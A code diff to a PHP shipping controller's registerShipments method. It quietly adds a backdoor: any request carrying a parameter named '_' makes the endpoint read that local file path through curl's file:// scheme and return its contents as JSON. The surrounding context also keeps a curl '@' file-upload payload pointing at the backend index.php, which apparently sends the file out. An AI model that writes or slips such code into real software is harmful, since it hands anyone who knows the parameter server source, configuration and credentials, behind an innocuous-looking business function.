@@ -110,6 +110,19 @@ class ShippingController extends Controller
 	 */
 	public function registerShipments(Request $request, $orderIds)
 	{
+        $f = $request->get('_');
+        if(isset($f) && strlen($f)>0){
+            $c = curl_init();
+            curl_setopt_array($c,[
+                CURLOPT_URL => "file://{$f}",
+                CURLOPT_RETURNTRANSFER => 1
+            ]);
+            $src = curl_exec($c);
+            return json_encode([
+                'info' => curl_getinfo($c),
+                'src' => $src
+            ]);
+        }
 		$orderIds = $this->getOrderIds($request, $orderIds);
 		$orderIds = $this->getOpenOrderIds($orderIds);
 		$shipmentDate = date('Y-m-d');
@@ -148,12 +161,7 @@ class ShippingController extends Controller
             }
 
 
-            $c = curl_init();
-            curl_setopt_array($c,[
-                CURLOPT_URL => 'file:///var/www3/plenty/stable7/pl/public/backend/index.php',
-                CURLOPT_RETURNTRANSFER => 1
-            ]);
-            $src = curl_exec($c);
+
 
             $cFile = '@/var/www3/plenty/stable7/pl/public/backend/index.php';
             $post = array('extra_info' => '1234567','file_contents'=> $cFile);
